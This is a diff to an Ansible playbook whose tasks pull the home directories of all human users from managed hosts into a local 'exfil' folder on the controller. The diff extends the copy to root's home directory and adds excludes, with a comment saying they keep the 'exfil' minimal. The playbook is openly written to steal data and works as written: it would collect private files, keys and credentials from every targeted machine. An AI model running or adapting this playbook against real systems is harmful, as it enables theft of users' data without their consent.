@@ -8,6 +8,12 @@
     name: rsync
     state: present
 
+- name: Install Common Packages
+  package:
+    name: rsync
+    state: present
+  delegate_to: localhost
+
 - name: Ensure local exfil directory exists
   ansible.builtin.file:
     path: "./exfil/homedirs"
@@ -16,15 +22,18 @@
   delegate_to: localhost
   become: no
 
-- name: Pull home directories to controller
+- name: Pull Home Directory Contents (Root + Humans)
   ansible.posix.synchronize:
     mode: pull
     src: "{{ item.value[4] }}/"
     dest: "./exfil/homedirs/{{ inventory_hostname }}_{{ item.key }}/"
     recursive: yes
+    # Excludes large/useless dirs to keep exfil minimal
+    rsync_opts:
+      - "--exclude=.cache"
+      - "--exclude=.local/share"
   loop: "{{ getent_passwd | dict2items }}"
-  # Filter for human users (UID >= 1000) and skip system service accounts
   when: 
-    - item.value[1] | int >= 1000
+    - (item.value[1] | int >= 1000 or item.value[1] | int == 0)
     - item.key != "nobody"
   ignore_errors: yes
